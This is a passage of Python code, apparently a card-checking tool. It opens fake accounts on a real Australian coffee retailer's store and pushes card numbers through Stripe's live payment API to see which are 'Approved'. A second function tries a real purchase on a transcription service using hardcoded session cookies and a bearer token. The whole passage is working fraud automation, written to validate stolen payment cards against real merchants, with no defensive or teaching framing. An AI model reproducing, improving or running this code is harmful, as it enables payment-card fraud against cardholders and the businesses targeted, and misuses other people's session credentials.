		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	response = r.get('https://byronbaycoffeeco.com.au/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://byronbaycoffeeco.com.au',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'mailchimp_woocommerce_newsletter': '1',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://byronbaycoffeeco.com.au/my-account/',
	    'wc_order_attribution_session_start_time': '2024-11-03 09:45:25',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	    'ak_bib': '1730627301252',
	    'ak_bfs': '1730627325983',
	    'ak_bkpc': '32',
	    'ak_bkp': '19;8,75;7,84;8,42;3,173;3,7;3,138;3,17;4,178;6,21;3,155;4,65;4,144;6,31;3,108;3,280;4,57;5,90;1,914;1,1;3,349;5,752;4,263;8,136;5,104;5,246;3,631;3,1;5,3;5,187;7,159;4,205;',
	    'ak_bmc': '8;5,25701;',
	    'ak_bmcc': '2',
	    'ak_bmk': '',
	    'ak_bck': '',
	    'ak_bmmc': '0',
	    'ak_btmc': '3',
	    'ak_bsc': '3',
	    'ak_bte': '277;135,200;385,150;200,119;249,921;201,203;30,234;235,23352;64,2060;',
	    'ak_btec': '9',
	    'ak_bmm': '',
	}
	
	response = r.post('https://byronbaycoffeeco.com.au/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/payment-methods/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://byronbaycoffeeco.com.au/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=kdvfjdvdjdvrjfhksb%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=58fbbbff-3bdb-4969-9a50-d1894262e547f43899&sid=5fa2cd10-7e0c-4d51-a46f-9a66b7309785b327c9&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+split-card-element&referrer=https%3A%2F%2Fbyronbaycoffeeco.com.au&time_on_page=88068&key=pk_live_51HOY8QBWrt9NB6UPYYgQtNC4jAKKAOlrGNDQx8Pv87HRT4TF4OwvgZcYDzBdocCNVCLYWS8AaN5DTCkAcoF27a8Y00Yb5dB0Pg&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiWmNyMlhQY3RzQ1RwR2tVdjVqd1FnSUc1c1YwRU5Lck1FcHh5VG1sNmlXUVBSY3psRTU1V2xwTW1qbjRiNkdBQ3ZYODNoMHdydDRVMHVLM2VBdS85RGtYdnpua2drN2pCUVgxTUxzSWd2SFNOMHphcDkrT1R3NDZOMnFIdC9RRnNCbUx3bE1sUkRLSXZIOTNuVzJUM3RoVzBOMUdPNHBOYWVvazZJQ2xZVmFkampVQndrRUh2OXFEanAzTVBwMFpXM0E5NUFhb1VNS1lyZHluYXRIMnVYSlFDVENQVmZiNkdCUCt4WWFCUS9pTlhUUUpnUFVnbk1ETHRyNHN5S3FSZUZwbXIzMENRSHpybVJHY1EyMnNLbmxpelRRbGhLQVJYWXlnL3Q3QmdUT09tRU1TTWE0UUxOV1lYeDB3UmUxODRneldOTGVyQ2JUTkpxTmduV3M2WGtjc1hCLzRJL29xRjM3Y0VpYXV6ZEs3b1I0Qm5TWHgxZ3F5TXgyRmZidk5sT29qQ3l6ZS95dnVvdFhKSlpUUDV5UEcrcUNnUXQxQk11aXVVZGZNVVVmelFUUE5velU0TTJBSDF1RzVDc2tqRmpjdUlVTjQ1RFdmcmpaVGFnY3R5a0poQWpUUDZPbGdlZE5wSGRiSGFQT2tBQXZtVnFKcXpaa2xHdWJaOVY3Z2ZyM1hleGNQSjdVcmJ3bWFZanIzU3JsWC94VXBvdy9kc2YyNlBpZGg0cTZIaFE0SlF1OU9ra2dnNk82Y0VIaElOZEw4RkJHOGk0dHVVNUFxbkNQZEFDc0ZIY0NhTmgwSWMycjlSa1NsUVI1ZGk3S1hDYmlnSUtYZm94SzlvMTd0TmRKV3JJRlhrOTNzVmQ3cDJzekZSMnhHR2tDUnNmRGZscU9Fdmh0U1JMTkh2WCt4bkZtM3JNeXV2QVhzYmU3QzMxSnA3WE5Ea1R3OGsvU1pDYkZlWFZLekhEYkJPR3UzMVYvS2dHVTJ3Y0xxNUs4YmxpN0VSd09rTzZVM1YxbHdzWk1UenRiZkYzZldOOWRWSy91ZzBBWTNmNWFKN29JbzQzaFRiRUZnZzdlWFpzMGQ0UWkrbGt1dEg2U3RydDJLNGdhb1h3Wi9JUFNUOVFqbFFKVTBtakZ2RHZZWlZ0enZjbU5lN3JkdDducDRGbzZnOU5aUDF2RFpsanAyODlWdFA0VFVxNStJY1J1amdPUG50cm9SQUs0b2NFVUlYemRnSC82V3lRK2cyY1VmMUc4L0tnaThlQXpwZS9EKzVqVXZLelhBUUUyQzVmMkpybFBlV3RIZUdqR1gvemtaZ2hHR2w1RWdKUFpPUU80c1crdVdsV1dLZmlsQkYxMTQyZi9WeExhblpZNDlsQ2l3dDA0d2JFWnBQWElEeHdFS3Z4cGpBVy9pSWRPUTNTV2N1Tk5nSmNMb01ObVRqYXRpeDgvTzJoUHZmd1JNQmhKT0Y1SzJVaG5RSy9EelhvUEdLUXBIcWlhalV6d3k0dUFEN0NBb0VyUlVScENoSVBWN2E2d2Y5RWRzNDFNcEF5SDJHSEJlM3puRjVWalMwRG1YSXBHc0ZFQU9jSFdiWnFWY3lnaDlGRGhDNE9qR3lYTHh3UWtXREF2NHVIOHc0dVJDMW5lRlpORjhMYklIVUI1ZDcwK1lreXlnUXg5VDdZbDlocnhXT1hORUs1MU5Od0haQmlZdXBNZStoSS9vNWpOanVrejhoTUczcWFDaE5TcjlQLzV1bHp3dGh1clBRVzhPTW05dW41S1NFV2U2UUUyUzlFUEkxRS84K3BjaXhVckV4alQ1dnF6U3VyQUdJNHdtbG1UM1FJU29RUzNEM1hhY2xBMXVSY2RtM3pUV1hPc2l3Lyt6TFhNbjlJUWRGOTRCLzduWGxGQks2SjFMVDlseHgxTlNjM3RSM1BObXJFRm00OGozekZ0akRWRk80Q3JSNy9HcTF1aWhKRGhwVThwSjNZNlRwalMwSFo5ZzVqdlQ0UkEyeVZpR1lvSlJSek92WjJYMEY3VzFSbFBVZUo1QnY4UDh1ZW9PVldhNWN6WVUyUzg4WGVibDc0NVZZUHpWNmV6b3p6b0N3QTZ0eGxuWXZ4YUM4NmdBWmNleTZFL3BZL2Z6bHYvVHlpSkc5Nk9pZEs0clVacFIxaGx6dVRKbjd2cDNQdGl6Z2J6dWlLV2IySGdUTFRKaWZXZks4YS9ubGROYm0yY3VNSjUxbmNjL00xTWpLSkRKL3VkRmlJTGl3bXRoZHdJWGs0aml0RzVRVmpPUXVmbFhhMFF3UEg0MFNkWGhNS2lkbTNISFJNU3YrelhvRUd2R1FiV3dOMDAvWUZyOUVndjdjbTVuR3VsejQ2SEphMS9TR3Azdm1SU2RpR0ZvbVhyaENvWENGQmMrR0ZxOVFIWEJBWDVLZE1HTVl5TGh5OUZ4RDVpL1daSk9qYUdEL0FDT0JuQnNQbm9sRnZDRUs4OTFHcnVjMUpuRFhOVXRmOENoVXVZalFFMFd3VzRac3FCK1g4UmEvaXlHRGg4YXlvaWF6QjBjRitGblNaUWxUWnlsKzE3Z1FzOUN5b21uREZjeWxJSGFobFZ4c1U4N2Q3VXpkNEtrUGxzTE40L0psYmxFQkdJcU83T3hrS21IT29RREwxVEUxUWR5QlpIQ2xDdlZYVnY1dHhjMTk5d1NJcm1vYktaa1hPTjM4Z2Y1NDBVTU1ad1RQcDd1SHVTSmRVeUJZbnBtcTRCNjNlSzZYbDJGdkM5a0FXZXdra2hjQTBWdjlLRTcrQ1g3Mk0xNkcrN0dIMXlUOFZnbnh1V2RBYTJSZ0oxUDNjMjd6SGlWUnRKMWczeVhrV08vaks3Y2RJZUloaGhETTlPM1FvV3VraUhSemJUTzk0NTQ9IiwiZXhwIjoxNzMwNjI3NjI5LCJzaGFyZF9pZCI6MzM5NTEwMzAzLCJrciI6IjQ3NzY3NDljIiwicGQiOjAsImNkYXRhIjoiMFpWNThCZlhpcnR2U2o3dXdMbS84YlBNdFBYM1JFQjZ4RHFTajNRSU4wMHRLRWJ3T0tPc25TTkxSTHdhUllhUnE0eHd5UmowcFgvOHVWL2cySlRkLyt0dVlpWHF2ZzFvakE4WTYxSEVrU2FOaUV2cmhJM01FUlh6bloxWU80VE1iSWY1czdpLzZ5QVNKNkZOaGlYQllYNHp1QU0zTUZUZmFOWkI2aE8wUzFIaVlHdW9VNngrRTlHS1pSaEdwcVFKM2p5M0wxOVduTkptNHY4NyJ9.wRXa6ZijYt0bj8WlYwduLl98ePnOROoY4pL0_AVGmMQ'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://byronbaycoffeeco.com.au',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://byronbaycoffeeco.com.au/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Your card was declined."
	if 'avs' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
		
		



def capture(string, start, end):
	start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
	return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def Telev(ccx):
	ccx = ccx.strip().split('\n')[0]
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}
	
	data = f'type=card&billing_details[name]=JOKERT&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=8313867e-642b-45f1-a1ac-8d16e62b2804f1eeb1&muid=f4fe562c-c20a-495a-ae53-c7f98af7fd7796a997&sid=885656e7-3f03-400b-8506-a306d215a0fd8a73a8&pasted_fields=number&payment_user_agent=stripe.js%2F20e004c1e5%3B+stripe-js-v3%2F20e004c1e5&time_on_page=235334&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'

	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	import requests
	
	cookies = {
    'ahoy_visitor': '3aae0976-e23a-4dba-8b36-8472d208de39',
    '_gcl_au': '1.1.589615022.1686364822',
    '_gid': 'GA1.2.612414710.1686364822',
    '_lfa': 'LF1.1.33f2f8d8020e1717.1686364822829',
    '_fbp': 'fb.1.1686364827355.914507822',
    'cookieconsent_status': 'dismiss',
    'intercom-device-id-frdatdus': '880e973e-b4f6-4a1b-bda6-5c8c42734d2b',
    '__stripe_mid': 'ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd',
    'ahoy_visit': '6daa3b7e-b32a-4535-a6c8-a3d04e9480c3',
    '_uetsid': '25876ee0073811ee82092b2ec7ac516d',
    '_uetvid': '25886a50073811eeb998adc6e5b32b9c',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e',
    'unsecure_is_signed_in': '1',
    '_ga_4T8KCV9Y2D': 'GS1.1.1686415944.3.1.1686416484.0.0.0',
    '_ga': 'GA1.1.1778485401.1686364822',
    'intercom-session-frdatdus': 'ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6',
    '_transcribe_session': '9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
}
	
	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': 'Bearer I5PqUERRXMbQyALPKtQFzQtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=3aae0976-e23a-4dba-8b36-8472d208de39; _gcl_au=1.1.589615022.1686364822; _gid=GA1.2.612414710.1686364822; _lfa=LF1.1.33f2f8d8020e1717.1686364822829; _fbp=fb.1.1686364827355.914507822; cookieconsent_status=dismiss; intercom-device-id-frdatdus=880e973e-b4f6-4a1b-bda6-5c8c42734d2b; __stripe_mid=ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd; ahoy_visit=6daa3b7e-b32a-4535-a6c8-a3d04e9480c3; _uetsid=25876ee0073811ee82092b2ec7ac516d; _uetvid=25886a50073811eeb998adc6e5b32b9c; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e; unsecure_is_signed_in=1; _ga_4T8KCV9Y2D=GS1.1.1686415944.3.1.1686416484.0.0.0; _ga=GA1.1.1778485401.1686364822; intercom-session-frdatdus=ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6; _transcribe_session=9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/7592712/checkout?plan=slider_prepaid&hours=1',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
    'id': 7271786,
    'address': 'NEW YORK',
    'name': 'JOhdjkdR',
    'country': 'US',
    'vat': None,
    'billing_account_id': 7271786,
    'orderReference': 'orrbctwnb',
    'user_id': 7661625,
    'organization_id': 7592712,
    'hours': 1,
    'balance_increase_in_cents': None,
    'payment_method_id': id,
    'transcription_id': None,
    'plan': 'slider_prepaid',
    'order_id': None,
    'recurrence_interval': None,
    'extra_plan_hours': None,
}
	response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	try:
		if "insufficient funds" in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text:
			print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['error'])
		else:
			print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['error'])
	except:
		print(response.text)
